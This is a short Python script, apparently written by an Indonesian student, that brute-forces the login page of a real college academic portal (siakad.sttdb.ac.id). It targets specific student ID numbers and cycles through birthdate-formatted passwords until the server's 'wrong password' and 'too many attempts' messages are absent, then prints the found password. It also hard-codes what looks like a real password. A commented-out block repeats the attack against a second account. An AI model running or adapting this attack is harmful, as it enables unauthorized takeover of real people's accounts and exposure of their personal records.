import requests

url_login = 'https://siakad.sttdb.ac.id/index.php/login'
url_logout = 'https://siakad.sttdb.ac.id/index.php/logout'

form_data = {
    'act' : 'login',
    'username' : '19158583',
    'password' : '20000421',
}
word_error = 'Percobaan login terlalu banyak'
word_fail = 'Username atau Password salah'

tahun = ['1998','1999','2000','2001','2002','2003','2004','2005','2006']
bulan = ['01','02','03','04','05','06','07','08','09','10','11','12']
tgl = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30']
clue = True
ketemu = False
pas = ''
for x in(tgl):
    for y in(bulan):
        for z in(tahun):
            pas = z+y+x
            p = requests.post(url=url_login, data={
                'act' : 'login',
                'username' : '19158583',
                'password' : pas,
            })
            fail = p.text.find(word_fail)
            error = p.text.find(word_error)
            
            if(int(fail) < 0 and int(error) < 0 ):
                # print('gagal fail:' + str(fail) + ' error=' + str(error))
            # else:
                print('Berhasil, Pass=' + pas)
                break

# with requests.Session() as sesi:
#     tahun = '1996'
#     bulan = ['01','02','03','04','05','06','07','08','09','10','11','12']
#     tgl = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30']
#     clue = True
#     ketemu = False
#     pas = ''
#     for x in(tgl):
#         for y in(bulan):
#             pas = tahun+y+x
#             p = sesi.post(url=url_login, data={
#                 'act' : 'login',
#                 'username' : '19158558',
#                 'password' : pas,
#             })
#             fail = p.text.find(word_fail)
#             error = p.text.find(word_error)
            
#             if(int(fail) >= 0 or int(error) >=0 ):
#                 print('gagal fail:' + str(fail) + ' error=' + str(error))
#             else:
#                 print('Berhasil, Pass=' + pas)
#                 break

    

    

